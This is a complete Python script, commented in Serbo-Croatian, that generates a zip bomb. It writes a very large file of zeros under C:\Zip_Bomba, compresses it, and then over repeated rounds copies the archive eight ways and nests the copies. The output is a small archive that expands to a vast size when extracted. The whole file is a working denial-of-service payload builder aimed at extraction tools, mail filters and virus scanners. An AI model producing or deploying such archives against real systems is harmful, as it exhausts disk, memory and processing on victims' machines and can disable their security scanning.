import os
import shutil
import zipfile
import zlib

razlika = 1
folder_zip_bombe = 'C:\\Zip_Bomba'

if not (os.path.exists(folder_zip_bombe)):
	os.mkdir(folder_zip_bombe)                                                               #kreiranje foldera Zip_Bomba										 
	
pitanje = input("Kako zelite da se zove fajl: ")

path_fajla = "C:\\Zip_Bomba\{0}.txt".format(pitanje)			
lista_zip_fajlova = []												

def pitanje_za_ime_fajla(x):
	try:
		fajl = open("C:\\Zip_Bomba\{0}.txt".format(x), "w")
	finally:
		fajl.close()
		
def glavni():
	velicina_pomocna = os.stat("C:\\Zip_Bomba\{0}.txt".format(pitanje))
	velicina = velicina_pomocna.st_size / 1024
	nula = 50000 * "0"
	
	print("\nKreiranje zip bombe je zapocelo...\nMolimo Vas da sacekate!\n")
	
	with open("C:\\Zip_Bomba\{0}.txt".format(pitanje), "a") as fajl:
		while (velicina < (1048856)):
			fajl.write(nula)
			velicina_pomocna = os.stat("C:\\Zip_Bomba\{0}.txt".format(pitanje))
			velicina = velicina_pomocna.st_size / 1024

def zipovanje(ime_zipovanog, ime_mete, dodatak):

	zipuj = zipfile.ZipFile('C:\\Zip_Bomba\{0}.zip'.format(ime_zipovanog), 'w', zipfile.ZIP_DEFLATED)
	
	try:
		zipuj.write('C:\\Zip_Bomba\{0}.{1}'.format(ime_mete, dodatak), '{0}.{1}'.format(ime_mete, dodatak))  # arcname = pitanje(pitanje je ime fajla unutar zipa)
	finally:
		zipuj.close()
		
def brisanje_fajlova():  		
	global path_fajla
	
	os.remove(path_fajla)

def brisanje_svih_zipova(ime):
	global lista_zip_fajlova

	for zipic in lista_zip_fajlova:
		os.remove(zipic)
	
	lista_zip_fajlova.clear()
		
def kopiraj_zipove(ime):
	global lista_zip_fajlova
	brojac = 1
	razlika = 1
	pomocni_brojac = 1
	lista_zip_fajlova.append('C:\\Zip_Bomba\{0}.zip'.format(ime))
	
	while (brojac < 8):
	
		destinacija = "C:\\Zip_Bomba\{0}{1}.zip".format(ime, razlika)
		lista_zip_fajlova.append(destinacija)
		shutil.copyfile("C:\\Zip_Bomba\{0}.zip".format(ime), destinacija)
		razlika += 1
		brojac += 1
		pomocni_brojac += 1
		
def brisi(ime):
	os.remove('C:\\Zip_Bomba\{0}.zip'.format(ime))

def zipovanje_svih_zipova(ime_zipovanog):

		global lista_zip_fajlova
		
		zipuj = zipfile.ZipFile('C:\\Zip_Bomba\{0}.zip'.format(ime_zipovanog), 'w', zipfile.ZIP_DEFLATED)
		brojac = 1
		for zipic in lista_zip_fajlova:	
			zipuj.write(zipic, 'Bomba{0}.zip'.format(brojac))
			brojac += 1
		
		zipuj.close()
		

pitanje_za_ime_fajla(pitanje) 				  #trazimo naziv txt fajla		
glavni()					  				  #kreiramo txt fajl
zipovanje('Bomba', pitanje, 'txt')			  #upakujemo txt fajl u Bomba.zip
brisanje_fajlova()			  				  #brisemo txt fajl
zipovanje('Bombica', 'Bomba', 'zip')		  #upakujemo Bomba.zip u Bombica.zip
brisi('Bomba')			  				  	  #brisemo Bomba.zip
zipovanje('Bomba', 'Bombica', 'zip')		  
brisi('Bombica')			  	

for i in range(16):
	kopiraj_zipove('Bomba')					  #kloniramo osam zipova
	zipovanje_svih_zipova('Bombica')	  	  #zipujemo citav folder, tj sve zipove i smjestamo ih u Bombica.zip
	brisanje_svih_zipova('Bomba')			  #brisemo sve stare zipove
	kopiraj_zipove('Bombica')
	zipovanje_svih_zipova('Bomba')
	brisanje_svih_zipova('Bombica')
	if (i == 4 or i == 6 or i == 8 or i == 10 or i == 12 or i == 14 or i == 15):
		zipovanje('Bombica', 'Bomba', 'zip')
		zipovanje('Bomba', 'Bombica', 'zip')
		
brisi('Bombica')
	




	


